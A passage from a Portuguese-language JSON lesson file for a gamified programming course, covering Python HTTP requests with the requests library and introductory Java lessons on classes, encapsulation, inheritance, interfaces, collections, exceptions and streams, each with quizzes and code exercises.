        "content": "# 🌐 Requisições HTTP e Consumo de APIs com requests\n\nMissão de graduação no AI Planet! Para alimentar modelos de Machine Learning ou integrar ferramentas de automação, seu código Python precisa saber conversar com a internet através do protocolo HTTP.\n\n> **💡 A Biblioteca requests**\n> A biblioteca `requests` é o padrão da indústria em Python para comunicação HTTP (\"HTTP for Humans\"). Ela torna trivial disparar verbos como GET, POST, PUT e DELETE com cabeçalhos e autenticação.\n\n---\n\n### 🛰️ Consumindo uma API REST com GET\n\n```python\nimport requests\n\ndef buscar_clima_espacial(planeta: str):\n    url = f\"https://api.nexus.io/planetas/{planeta}/clima\"\n    headers = {\"Accept\": \"application/json\"}\n\n    try:\n        resposta = requests.get(url, headers=headers, timeout=5)\n        \n        # Lança uma exceção se a resposta for 4xx ou 5xx!\n        resposta.raise_for_status()\n\n        dados = resposta.json()\n        print(f\"Temperatura em {planeta}: {dados['temperatura']} °C\")\n        return dados\n    except requests.exceptions.RequestException as erro:\n        print(f\"Falha de telemetria na requisição: {erro}\")\n        return None\n```\n\n---\n\n### 📤 Enviando Dados com POST e Autenticação\n\n```python\ndef enviar_telemetria(dados_missao: dict, token_jwt: str):\n    url = \"https://api.nexus.io/telemetria\"\n    headers = {\n        \"Authorization\": f\"Bearer {token_jwt}\",\n        \"Content-Type\": \"application/json\"\n    }\n\n    resposta = requests.post(url, json=dados_missao, headers=headers, timeout=10)\n    if resposta.status_code == 201:\n        print(\"Dados gravados com sucesso no servidor central!\")\n    return resposta.status_code\n```\n\n- Ao passar o argumento `json=dicionario`, o `requests` faz a serialização automática para string JSON e configura o cabeçalho `Content-Type: application/json` sozinho!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o parâmetro `timeout` nas chamadas! Sem um timeout explícito, se o servidor remoto travar ou a rede congelar, o seu script Python ficará parado indefinidamente para sempre!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use sempre `resposta.raise_for_status()` para tratar códigos de erro HTTP como exceções previsíveis.\n- Utilize `requests.Session()` se você for fazer muitas requisições consecutivas para o mesmo domínio: ela reaproveita a conexão TCP via Keep-Alive!\n\n> **🛡️ Regra de Ouro:**\n> Sempre trate `requests.exceptions.RequestException` para blindar seu script contra quedas de internet e falhas de DNS.",
        "codeExample": "import requests\n\ndef obter_ip_publico():\n    try:\n        res = requests.get(\"https://api.ipify.org?format=json\", timeout=3)\n        res.raise_for_status()\n        return res.json().get(\"ip\")\n    except requests.RequestException:\n        return \"Offline\"",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Python com a biblioteca requests, qual método lança automaticamente uma exceção caso o servidor responda com erro 4xx ou 5xx?",
            "options": [
              "resposta.validate_error()",
              "resposta.raise_for_status()",
              "resposta.check_connection()",
              "resposta.throw_http_exception()"
            ],
            "correctIndex": 1,
            "explanation": "O método raise_for_status() avalia o código de retorno e dispara uma HTTPError caso o status seja 4xx (erro do cliente) ou 5xx (erro do servidor)."
          },
          {
            "type": "code",
            "instruction": "Utilize \"requests.get\" para buscar a URL \"https://api.nexus.io/status\" com timeout=5 e armazene a resposta na variável \"resposta\".",
            "initialCode": "import requests\n# Dispare a requisição aqui\n",
            "expectedKeywords": [
              "resposta = requests.get(",
              "\"https://api.nexus.io/status\"",
              "timeout=5"
            ],
            "hint": "Use: resposta = requests.get(\"https://api.nexus.io/status\", timeout=5)",
            "solution": "import requests\nresposta = requests.get(\"https://api.nexus.io/status\", timeout=5)"
          }
        ]
      }
    ]
  },
  {
    "id": "java",
    "slug": "java",
    "name": "Java",
    "planetName": "Enterprise World",
    "description": "A robustez da orientação a objetos corporativa que move bancos e gigantes da indústria.",
    "icon": "☕",
    "color": "#F89820",
    "language": "java",
    "level": "Avançado",
    "totalXp": 520,
    "lessons": [
      {
        "id": "java-1",
        "title": "1. O Paradigma dos Objetos & Classes Corporativas",
        "description": "Compreenda a JVM, a força da tipagem estática e o ponto de entrada main.",
        "duration": 16,
        "xpReward": 60,
        "language": "java",
        "content": "# ☕ O Paradigma dos Objetos no Enterprise World\n\nBem-vindo a **Enterprise World**, o planeta onde a confiabilidade inquebrável, sistemas bancários e naves de transporte massivo são construídos!\n\nO **Java**, criado por James Gosling na Sun Microsystems em 1995 (hoje sob a Oracle), é um dos pilares da engenharia de software mundial há mais de três décadas.\n\n---\n\n### 🌐 O Lema: \"Write Once, Run Anywhere\" (WORA)\n\nDiferente de linguagens como C++ que compilam diretamente para o código binário de um processador específico, o Java compila para **Bytecode** (`.class`). Esse Bytecode roda em qualquer máquina que tenha a **JVM** (*Java Virtual Machine*).\n\n---\n\n### 🚪 A Porta de Entrada: O Método `main`\n\nTodo programa executável em Java inicia obrigatoriamente a partir de um método com esta assinatura exata:\n\n```java\npublic class EstacaoEspacial {\n    public static void main(String[] args) {\n        System.out.println(\"Sistemas da Estação Online!\");\n    }\n}\n```\n\n- **`public`**: Acessível externamente pelo sistema operacional.\n- **`static`**: Pode ser executado pela JVM sem precisar instanciar a classe primeiro.\n- **`void`**: Não devolve nenhum valor de retorno.\n- **`String[] args`**: Vetor de argumentos recebidos pela linha de comando.\n\n> **💡 Dica Pro:**\n> O nome do arquivo Java deve ser **exatamente idêntico** ao nome da classe pública (ex: a classe `public class Nave` deve ficar no arquivo `Nave.java`), respeitando maiúsculas e minúsculas!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o ponto-e-vírgula (`;`) no final das instruções em Java impede o código de compilar.",
        "codeExample": "// Programa de Boas-Vindas da Enterprise World\npublic class TerminalNexus {\n    public static void main(String[] args) {\n        String cadete = \"Lucas\";\n        int nivelAcesso = 5;\n        \n        System.out.println(\"Oficial: \" + cadete + \" | Credencial: \" + nivelAcesso);\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o papel da JVM (Java Virtual Machine) no ecossistema da linguagem Java?",
            "options": [
              "Criar arquivos visuais em HTML para os navegadores.",
              "Executar o Bytecode compilado (.class) de forma independente do sistema operacional subjacente.",
              "Converter código Java diretamente para Python em tempo de execução.",
              "Gerenciar exclusivamente conexões com a internet."
            ],
            "correctIndex": 1,
            "explanation": "A JVM é a máquina virtual que interpreta ou compila via JIT o Bytecode Java em instruções nativas do hardware específico onde o programa está rodando."
          },
          {
            "type": "fillblank",
            "title": "A Assinatura do Método Mestre",
            "instruction": "Preencha as palavras-chave que faltam na assinatura universal do método de entrada do Java.",
            "codeSnippet": "public {{modificador_estatico}} void main({{tipo_argumento}}[] args) {\n    System.out.println(\"Inicialização concluída.\");\n}",
            "blanks": [
              {
                "id": "modificador_estatico",
                "placeholder": "modificador estático",
                "expectedValues": [
                  "static"
                ],
                "hint": "Palavra-chave que permite chamar o método sem precisar instanciar um objeto com new."
              },
              {
                "id": "tipo_argumento",
                "placeholder": "tipo do vetor de texto",
                "expectedValues": [
                  "String"
                ],
                "hint": "Classe que representa textos no Java (com inicial Maiúscula)."
              }
            ],
            "explanation": "Perfeito! public static void main(String[] args) é o portal de partida de qualquer aplicação Java corporativa."
          }
        ]
      },
      {
        "id": "java-2",
        "title": "2. Encapsulamento, Construtores & Segurança",
        "description": "Proteja o estado interno das suas classes com private, getters e construtores robustos.",
        "duration": 17,
        "xpReward": 65,
        "language": "java",
        "content": "# 🛡️ Encapsulamento, Construtores & Segurança\n\nEm sistemas de grande porte, permitir que qualquer parte do código altere diretamente atributos sensíveis (como saldo bancário ou nível de oxigênio de uma nave) é um convite ao desastre.\n\n---\n\n### 🔒 O Pilar do Encapsulamento\n\nO **Encapsulamento** consiste em ocultar os detalhes internos de um objeto e expor apenas métodos seguros para leitura e escrita:\n\n1. Atributos são declarados como **`private`**.\n2. O acesso para leitura é feito via método **`get`**.\n3. A alteração controlada é feita via método **`set`**.\n\n```java\npublic class ModuloEscudo {\n    private int potencia;\n\n    // Construtor\n    public ModuloEscudo(int potenciaInicial) {\n        this.setPotencia(potenciaInicial);\n    }\n\n    public int getPotencia() {\n        return this.potencia;\n    }\n\n    public void setPotencia(int novaPotencia) {\n        if (novaPotencia >= 0 && novaPotencia <= 100) {\n            this.potencia = novaPotencia;\n        }\n    }\n}\n```\n\n---\n\n### 🎯 A Palavra-Chave `this`\n\nA palavra `this` referencia a instância atual do próprio objeto, resolvendo ambiguidades entre os parâmetros do método e os atributos da classe:\n\n```java\npublic void setNome(String nome) {\n    this.nome = nome; // \"this.nome\" é o atributo; \"nome\" é o parâmetro recebido!\n}\n```\n\n> **💡 Dica Pro:**\n> Ao usar Getters e Setters, você pode incluir validações de negócio no `set` impedindo que dados corrompidos entrem na sua aplicação.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a palavra `this` em um construtor onde o parâmetro tem o mesmo nome do atributo (ex: `nome = nome;`) faz a variável atribuir valor a ela mesma, deixando o atributo da classe vazio!",
        "codeExample": "// Modelagem de Piloto com Encapsulamento\npublic class PilotoNexus {\n    private String nome;\n    private int horasVoo;\n\n    public PilotoNexus(String nome, int horasVoo) {\n        this.nome = nome;\n        this.horasVoo = horasVoo;\n    }\n\n    public String getNome() {\n        return this.nome;\n    }\n\n    public int getHorasVoo() {\n        return this.horasVoo;\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que no padrão corporativo Java os atributos de uma classe são declarados com o modificador de acesso \"private\"?",
            "options": [
              "Para impedir que a classe seja compilada por outros desenvolvedores.",
              "Para proteger os dados contra alterações diretas descontroladas, garantindo que o acesso ocorra apenas por métodos autorizados (Getters/Setters).",
              "Porque variáveis private gastam menos memória RAM.",
              "Porque o Java não permite criar variáveis sem a palavra private."
            ],
            "correctIndex": 1,
            "explanation": "O encapsulamento garante integridade aos dados do objeto, permitindo validar regras de negócio antes de aceitar qualquer alteração no estado interno."
          },
          {
            "type": "code",
            "instruction": "Crie uma classe pública chamada ModuloNave com um atributo privado int potencia e um método público getPotencia() que retorna a potencia.",
            "initialCode": "// Crie a classe ModuloNave abaixo\n",
            "expectedKeywords": [
              "public class ModuloNave",
              "private int potencia",
              "public int getPotencia()",
              "return"
            ],
            "hint": "Declare public class ModuloNave { private int potencia; public int getPotencia() { return this.potencia; } }.",
            "solution": "public class ModuloNave {\n    private int potencia;\n\n    public int getPotencia() {\n        return this.potencia;\n    }\n}"
          }
        ]
      },
      {
        "id": "java-3",
        "title": "3. Herança e Polimorfismo entre Classes",
        "description": "Estenda funcionalidades com extends, sobrescreva métodos com @Override e explore o polimorfismo dinâmico.",
        "duration": 16,
        "xpReward": 65,
        "language": "java",
        "content": "# ☕ Herança e Polimorfismo entre Classes\n\nFortalezas de Enterprise World! No desenvolvimento corporativo em Java, a herança e o polimorfismo são os pilares que permitem criar sistemas gigantescos com reutilização segura e desacoplamento.\n\n> **💡 O que é Polimorfismo?**\n> A palavra polimorfismo significa \"muitas formas\". Em Java, permite que uma referência de um tipo mais genérico (classe pai) aponte para um objeto de um tipo mais específico (classe filha) e execute o comportamento especializado em tempo de execução.\n\n---\n\n### 🏛️ Estendendo com `extends` e `super`\n\n```java\npublic class ModuloEspacial {\n    protected String nome;\n    protected int nivelEnergia;\n\n    public ModuloEspacial(String nome, int nivelEnergia) {\n        this.nome = nome;\n        this.nivelEnergia = nivelEnergia;\n    }\n\n    public void ativar() {\n        System.out.println(\"Módulo \" + nome + \" ativado com \" + nivelEnergia + \"MW.\");\n    }\n}\n```\n\nA classe filha especializa com `@Override`:\n\n```java\npublic class PropulsorDobra extends ModuloEspacial {\n    private int fatorDobra;\n\n    public PropulsorDobra(String nome, int nivelEnergia, int fatorDobra) {\n        super(nome, nivelEnergia); // Invoca o construtor da classe pai\n        this.fatorDobra = fatorDobra;\n    }\n\n    @Override\n    public void ativar() {\n        System.out.println(\"Propulsor de Dobra ativado no fator: \" + fatorDobra);\n    }\n}\n```\n\n---\n\n### ⚡ O Poder do Polimorfismo Dinâmico\n\n```java\n// O tipo da referência é a classe PAI, mas o objeto instanciado é a classe FILHA:\nModuloEspacial modulo = new PropulsorDobra(\"Dobra Alfa\", 500, 9);\nmodulo.ativar(); // Executa o método sobrescrito de PropulsorDobra!\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a anotação `@Override` ao sobrescrever um método. Se você errar uma única letra no nome ou nos tipos dos parâmetros, o compilador criará um método novo em vez de sobrescrever o original! O `@Override` força o compilador a validar isso.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use a palavra-chave `final` em métodos ou classes que não devam ser estendidos por segurança.\n- Declare atributos comuns como `protected` para que as subclasses os acessem diretamente sem expô-los publicamente.\n\n> **🛡️ Regra de Ouro:**\n> Programe voltado para tipos genéricos (interfaces ou superclasses), e não para implementações concretas rígidas.",
        "codeExample": "public class FrotaController {\n    public static void inicializarModulo(ModuloEspacial modulo) {\n        // Funciona para qualquer subclasse de ModuloEspacial!\n        modulo.ativar();\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual anotação do Java deve ser utilizada sobre um método para instruir o compilador a verificar se ele está realmente sobrescrevendo um método da superclasse?",
            "options": [
              "@Inherit",
              "@Override",
              "@Polymorphic",
              "@Super"
            ],
            "correctIndex": 1,
            "explanation": "A anotação @Override garante que o método possui a assinatura exata de um método da superclasse, acusando erro caso ocorra qualquer discrepância."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração da classe \"CacaEstelar\" que herda da classe \"NaveEspacial\" usando a palavra-chave extends.",
            "initialCode": "// Declare a classe CacaEstelar aqui\n",
            "expectedKeywords": [
              "public class CacaEstelar extends NaveEspacial {",
              "}"
            ],
            "hint": "Use: public class CacaEstelar extends NaveEspacial {\n}",
            "solution": "public class CacaEstelar extends NaveEspacial {\n}"
          }
        ]
      },
      {
        "id": "java-4",
        "title": "4. Interfaces e Injeção de Contratos",
        "description": "Estabeleça contratos arquiteturais com interfaces, múltiplos implements e desacoplamento de dependências.",
        "duration": 16,
        "xpReward": 65,
        "language": "java",
        "content": "# 📜 Interfaces e Injeção de Contratos\n\nArquitetura corporativa em Enterprise World! Enquanto o Java não permite herança múltipla de classes (uma classe só pode ter um `extends`), ele permite que uma classe assine quantos contratos quiser através de **Interfaces**.\n\n> **💡 O que é uma Interface?**\n> Uma `interface` é um contrato puramente abstrato. Ela dita **o que** uma classe deve fazer, mas não dita **como** fazer. Todas as assinaturas de métodos declarados nela são implicitamente públicas e abstratas.\n\n---\n\n### ✍️ Definindo o Contrato\n\n```java\npublic interface ComunicadorEstelar {\n    void transmitirMensagem(String canal, String texto);\n    boolean verificarSinal();\n}\n```\n\n---\n\n### 🛡️ Implementando o Contrato com `implements`\n\n```java\npublic class TransmissorLaser implements ComunicadorEstelar {\n    @Override\n    public void transmitirMensagem(String canal, String texto) {\n        System.out.println(\"Disparando pulso laser no canal \" + canal + \": \" + texto);\n    }\n\n    @Override\n    public boolean verificarSinal() {\n        return true;\n    }\n}\n```\n\n---\n\n### 🔌 Injeção de Dependência na Prática\n\nSistemas corporativos nunca dependem de classes concretas:\n\n```java\npublic class EstacaoEspacial {\n    // Depende da INTERFACE, não da classe concreta!\n    private final ComunicadorEstelar comunicador;\n\n    public EstacaoEspacial(ComunicadorEstelar comunicador) {\n        this.comunicador = comunicador;\n    }\n\n    public void enviarAlerta(String msg) {\n        this.comunicador.transmitirMensagem(\"EMERGENCIA\", msg);\n    }\n}\n```\n\nDessa forma, você pode trocar o `TransmissorLaser` por um `TransmissorQuantico` ou por um mock de testes sem mexer em uma única linha da `EstacaoEspacial`!\n\n> **⚠️ Armadilha Comum:**\n> Colocar lógica de negócios pesada dentro de interfaces. Desde o Java 8 existem métodos `default`, mas interfaces devem ser primariamente contratos limpos de comunicação.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Nomeie interfaces com adjetivos ou substantivos claros (ex: `Autenticavel`, `RepositorioCadete`, `Serializable`).\n- Aplique o Princípio da Segregação de Interfaces (ISP do SOLID): prefira várias interfaces pequenas e focadas a uma megainterface com 50 métodos.\n\n> **🛡️ Regra de Ouro:**\n> \"Programe para uma interface, não para uma implementação.\" — Gang of Four (GoF).",
        "codeExample": "public interface Sensor {\n    double lerMedicao();\n}\n\npublic class SensorRadiacao implements Sensor {\n    @Override\n    public double lerMedicao() {\n        return 42.5;\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Java, qual palavra-chave é utilizada por uma classe para adotar e cumprir os métodos definidos em uma interface?",
            "options": [
              "extends",
              "implements",
              "inherits",
              "uses"
            ],
            "correctIndex": 1,
            "explanation": "Uma classe usa a palavra implements para adotar uma ou mais interfaces e fornecer a implementação de seus métodos contratuais."
          },
          {
            "type": "code",
            "instruction": "Declare uma interface pública chamada \"Criptografavel\" com um método que retorna String chamado \"criptografar(String texto)\".",
            "initialCode": "// Crie a interface Criptografavel aqui\n",
            "expectedKeywords": [
              "public interface Criptografavel {",
              "String criptografar(String texto);",
              "}"
            ],
            "hint": "Use: public interface Criptografavel {\n    String criptografar(String texto);\n}",
            "solution": "public interface Criptografavel {\n    String criptografar(String texto);\n}"
          }
        ]
      },
      {
        "id": "java-5",
        "title": "5. Coleções Modernas: List, Set e Map",
        "description": "Gerencie grupos de dados corporativos com ArrayList, HashSet, HashMap e Generics tipados.",
        "duration": 16,
        "xpReward": 65,
        "language": "java",
        "content": "# 🗃️ Coleções Modernas: List, Set e Map\n\nOrganização de inventário em Enterprise World! No Java antigo, vetores fixos (`String[]`) eram limitados e engessados. A **Java Collections Framework** fornece estruturas de dados dinâmicas, altamente otimizadas e fortemente tipadas.\n\n> **💡 As Três Grandes Famílias de Coleções**\n> 1. **`List` (ArrayList)**: Lista ordenada que permite elementos duplicados e acesso rápido por índice.\n> 2. **`Set` (HashSet)**: Conjunto matemático que **não permite duplicatas** e possui verificação de existência ultrarrápida.\n> 3. **`Map` (HashMap)**: Dicionário de pares de **Chave e Valor** com busca instantânea O(1).\n\n---\n\n### 📋 Listas Dinâmicas com `ArrayList`\n\n```java\nimport java.util.List;\nimport java.util.ArrayList;\n\nList<String> cadetes = new ArrayList<>();\ncadetes.add(\"Alex\");\ncadetes.add(\"Beatriz\");\ncadetes.add(\"Alex\"); // Permitido em List!\n\nSystem.out.println(\"Total de cadetes: \" + cadetes.size()); // 3\nString primeiro = cadetes.get(0); // \"Alex\"\n```\n\n---\n\n### 🗺️ Dicionários de Dados com `HashMap`\n\n```java\nimport java.util.Map;\nimport java.util.HashMap;\n\n// Mapeia o ID do Cadete (String) para sua pontuação (Integer)\nMap<String, Integer> pontuacoes = new HashMap<>();\n\npontuacoes.put(\"CADETE-01\", 1500);\npontuacoes.put(\"CADETE-02\", 2300);\n\n// Busca instantânea pela chave\nif (pontuacoes.containsKey(\"CADETE-01\")) {\n    int pontos = pontuacoes.get(\"CADETE-01\");\n    System.out.println(\"Pontuação resgatada: \" + pontos);\n}\n```\n\n---\n\n### 🚫 Conjuntos Sem Duplicatas com `HashSet`\n\n```java\nimport java.util.Set;\nimport java.util.HashSet;\n\nSet<String> planetasVisitados = new HashSet<>();\nplanetasVisitados.add(\"Terra Digital\");\nplanetasVisitados.add(\"Neon City\");\nplanetasVisitados.add(\"Terra Digital\"); // Ignorado silenciosamente!\n\nSystem.out.println(planetasVisitados.size()); // 2 elementos únicos!\n```\n\n> **⚠️ Armadilha Comum:**\n> Declarar o tipo da variável com a classe concreta em vez da interface (ex: `ArrayList<String> lista = new ArrayList<>();`). Sempre declare com a interface: `List<String> lista = new ArrayList<>();`! Isso permite trocar a implementação interna no futuro sem quebrar nada.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Ao usar objetos customizados como chave de um `HashMap` ou itens de um `HashSet`, você DEVE sobrescrever os métodos `equals()` e `hashCode()`.\n- Itere sobre listas usando o for-each moderno: `for (String item : lista) { ... }`.\n\n> **🛡️ Regra de Ouro:**\n> Utilize a interface mais genérica possível para declarar variáveis e parâmetros de coleções.",
        "codeExample": "import java.util.Map;\nimport java.util.HashMap;\n\npublic class InventarioNave {\n    private final Map<String, Integer> estoque = new HashMap<>();\n\n    public void adicionarItem(String item, int qtd) {\n        estoque.put(item, estoque.getOrDefault(item, 0) + qtd);\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual coleção do Java Framework é especificamente projetada para garantir que nenhum elemento duplicado seja armazenado?",
            "options": [
              "java.util.ArrayList",
              "java.util.HashSet",
              "java.util.LinkedList",
              "java.util.Vector"
            ],
            "correctIndex": 1,
            "explanation": "HashSet implementa a interface Set, rejeitando automaticamente qualquer inserção de elemento que já exista na coleção."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código Java que instancie uma List de String chamada \"missoes\" usando ArrayList e generics.",
            "initialCode": "// Instancie a lista missoes aqui\n",
            "expectedKeywords": [
              "List<String> missoes = new ArrayList<>()",
              ";"
            ],
            "hint": "Use: List<String> missoes = new ArrayList<>();",
            "solution": "List<String> missoes = new ArrayList<>();"
          }
        ]
      },
      {
        "id": "java-6",
        "title": "6. Tratamento de Exceções com try, catch e finally",
        "description": "Construa aplicações à prova de falhas com Checked e Unchecked Exceptions e blocos try-with-resources.",
        "duration": 16,
        "xpReward": 65,
        "language": "java",
        "content": "# 🛡️ Tratamento de Exceções com try, catch e finally\n\nBlindagem de sistemas em Enterprise World! Em ambientes corporativos de missão crítica, sistemas não podem simplesmente travar e exibir telas pretas. O Java possui um modelo rígido de gerenciamento de exceções.\n\n> **💡 Checked vs Unchecked Exceptions**\n> - **Checked Exceptions** (herdam de `Exception`): O compilador **obriga** você a tratá-las com `try/catch` ou declará-las com `throws` na assinatura do método (ex: `IOException`, `SQLException`).\n> - **Unchecked Exceptions** (herdam de `RuntimeException`): Erros de lógica que não exigem tratamento obrigatório em tempo de compilação (ex: `NullPointerException`, `IllegalArgumentException`).\n\n---\n\n### 🛡️ O Bloco Try-Catch-Finally\n\n```java\npublic void calibrarReator(int porcentagem) {\n    if (porcentagem < 0 || porcentagem > 100) {\n        throw new IllegalArgumentException(\"Calibração fora dos limites seguros (0-100): \" + porcentagem);\n    }\n    System.out.println(\"Reator calibrado em \" + porcentagem + \"%\");\n}\n\npublic void executar() {\n    try {\n        calibrarReator(150);\n    } catch (IllegalArgumentException erro) {\n        System.err.println(\"Aviso de segurança: \" + erro.getMessage());\n    } finally {\n        System.out.println(\"Diagnóstico encerrado.\"); // Sempre executado!\n    }\n}\n```\n\n---\n\n### 🔄 Try-With-Resources (Java 7+)\n\nRecursos que implementam `AutoCloseable` (como conexões de banco e arquivos) fecham-se sozinhos quando colocados dentro dos parênteses do `try`:\n\n```java\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\ntry (BufferedReader leitor = new BufferedReader(new FileReader(\"telemetria.log\"))) {\n    String primeiraLinha = leitor.readLine();\n    System.out.println(primeiraLinha);\n} catch (IOException e) {\n    System.err.println(\"Erro na leitura do arquivo: \" + e.getMessage());\n}\n// O leitor foi fechado automaticamente aqui, sem necessidade de finally manual!\n```\n\n> **⚠️ Armadilha Comum:**\n> Capturar a classe genérica `Throwable` ou silenciar o erro com um bloco catch vazio (`catch (Exception e) {}`). Silenciar erros oculta falhas catastróficas e impede qualquer diagnóstico posterior!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Crie exceções de negócio personalizadas herdando de `RuntimeException` (ex: `CadeteNaoEncontradoException`).\n- Registre sempre as exceções em sistemas de logs profissionais (como SLF4J / Logback) em vez de usar apenas `System.out.println`.\n\n> **🛡️ Regra de Ouro:**\n> Capture apenas as exceções que você realmente sabe como recuperar no momento. Caso contrário, propague-as para a camada superior.",
        "codeExample": "public double calcularEficiencia(int energia, int perdas) {\n    try {\n        if (perdas > energia) {\n            throw new ArithmeticException(\"Perdas superiores à energia gerada.\");\n        }\n        return (double) (energia - perdas) / energia;\n    } catch (ArithmeticException e) {\n        System.err.println(\"Falha no cálculo: \" + e.getMessage());\n        return 0.0;\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Java, qual é a principal característica de uma Checked Exception em relação a uma Unchecked Exception?",
            "options": [
              "Checked Exceptions encerram o sistema operacional instantaneamente.",
              "O compilador Java exige obrigatoriamente que Checked Exceptions sejam tratadas em um bloco try-catch ou declaradas com a cláusula throws na assinatura.",
              "Checked Exceptions rodam apenas na memória secundária do disco.",
              "Checked Exceptions não podem conter mensagens explicativas."
            ],
            "correctIndex": 1,
            "explanation": "Checked Exceptions são verificadas em tempo de compilação, forçando o desenvolvedor a prever e tratar o erro de forma explícita."
          },
          {
            "type": "bughunt",
            "title": "Correção de Lançamento de Exceção Inválida",
            "scenario": "Um cadete tentou lançar uma exceção usando a palavra-chave throws no corpo do método em vez de throw. Corrija o comando de lançamento.",
            "buggyCode": "public void validar(int id) {\n  if (id <= 0) {\n    throws new IllegalArgumentException(\"ID inválido\");\n  }\n}",
            "expectedKeywords": [
              "throw new IllegalArgumentException(\"ID inválido\");"
            ],
            "forbiddenKeywords": [
              "throws new IllegalArgumentException"
            ],
            "hint": "Substitua throws por throw no momento de disparar a nova instância da exceção.",
            "solutionExplanation": "Utiliza-se throw (no singular) para disparar uma exceção no corpo do método, enquanto throws é usado na assinatura para declarar que o método pode lançá-la."
          }
        ]
      },
      {
        "id": "java-7",
        "title": "7. Streams API e Expressões Lambda",
        "description": "Processe grandes volumes de dados de forma funcional e declarativa com filter, map, collect e Streams.",
        "duration": 17,
        "xpReward": 65,
        "language": "java",
        "content": "# ⚡ Streams API e Expressões Lambda\n\nRevolução funcional em Enterprise World! Desde o Java 8, a linguagem incorporou a **Streams API** e **Expressões Lambda**, permitindo manipular coleções de forma concisa, imutável e expressiva.\n\n> **💡 O que é uma Stream em Java?**\n> Uma Stream é uma sequência de elementos que suporta operações agregadas em pipeline (como `filter`, `map`, `sorted`). Ela não armazena dados e não modifica a coleção original; ela apenas processa os dados sob demanda (*lazy evaluation*).\n\n---\n\n### 🌊 O Pipeline de uma Stream\n\nUm pipeline de Stream é composto por:\n1. **Fonte:** Coleção de onde vêm os dados (`lista.stream()`).\n2. **Operações Intermediárias:** Transformam a stream em outra stream (`.filter()`, `.map()`, `.sorted()`).\n3. **Operação Terminal:** Produz o resultado final (`.collect()`, `.count()`, `.forEach()`).\n\n```java\nimport java.util.List;\nimport java.util.stream.Collectors;\n\nList<String> cadetes = List.of(\"Alex\", \"Beatriz\", \"Carlos\", \"Amanda\", \"Arthur\");\n\n// Pipeline funcional elegante:\nList<String> cadetesComA = cadetes.stream()\n    .filter(nome -> nome.startsWith(\"A\")) // Filtra quem começa com A\n    .map(String::toUpperCase)             // Converte para maiúsculas com Method Reference\n    .sorted()                             // Ordena em ordem alfabética\n    .collect(Collectors.toList());        // Coleta em uma nova lista!\n\nSystem.out.println(cadetesComA); // [ALEX, AMANDA, ARTHUR]\n```\n\n---\n\n### 🚀 Paralelismo sem Esforço: `.parallelStream()`\n\nSe você tem uma lista com 1 milhão de registros e uma máquina com processador multi-core:\n\n```java\nlong ativos = naves.parallelStream()\n    .filter(Nave::isOperacional)\n    .count();\n```\n\nA JVM divide automaticamente o processamento entre todos os núcleos do processador sem você precisar gerenciar nenhuma thread manualmente!\n\n> **⚠️ Armadilha Comum:**\n> Tentar reutilizar uma Stream que já sofreu uma operação terminal. Uma Stream só pode ser consumida uma única vez! Ao tentar chamá-la novamente, uma `IllegalStateException` será disparada.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Prefira Method References (`String::toUpperCase`, `Nave::getId`) no lugar de lambdas completas (`s -> s.toUpperCase()`) quando possível.\n- Evite efeitos colaterais dentro das operações intermediárias de uma Stream (não altere variáveis externas).\n\n> **🛡️ Regra de Ouro:**\n> Escreva pipelines legíveis que contem uma história clara de transformação dos dados do início ao fim.",
        "codeExample": "import java.util.List;\n\npublic class CalculadoraFrota {\n    public static int somarPoder(List<Integer> poderes) {\n        return poderes.stream()\n            .filter(p -> p > 0)\n            .reduce(0, Integer::sum);\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a diferença entre uma operação intermediária (ex: filter) e uma operação terminal (ex: collect) na Streams API do Java?",
            "options": [
              "Operações intermediárias alteram a lista original, terminais não.",
              "Operações intermediárias retornam uma nova Stream e não executam o processamento até que uma operação terminal seja acionada.",
              "Operações terminais só podem ser usadas em listas de texto.",
              "Operações intermediárias precisam ser executadas com try-catch obrigatório."
            ],
            "correctIndex": 1,
            "explanation": "As operações intermediárias são lazy: apenas configuram a esteira. O processamento só acontece de fato quando a operação terminal é disparada."
          },
          {
            "type": "code",
            "instruction": "Dado um \"List<Integer> numeros\", escreva o pipeline de Stream que filtre os números pares (n % 2 == 0) e os colete em uma lista usando Collectors.toList().",
            "initialCode": "// Escreva a expressão do pipeline aqui\n",
            "expectedKeywords": [
              "numeros.stream()",
              ".filter(n -> n % 2 == 0)",
              ".collect(Collectors.toList())"
            ],
            "hint": "Use: numeros.stream().filter(n -> n % 2 == 0).collect(Collectors.toList());",
            "solution": "numeros.stream().filter(n -> n % 2 == 0).collect(Collectors.toList());"
          }
        ]
      },
      {
        "id": "java-8",
        "title": "8. Concorrência e Programação Multithread Básica",
        "description": "Execute tarefas paralelas com Thread, Runnable, ExecutorService e o moderno CompletableFuture.",
        "duration": 17,
        "xpReward": 70,
        "language": "java",
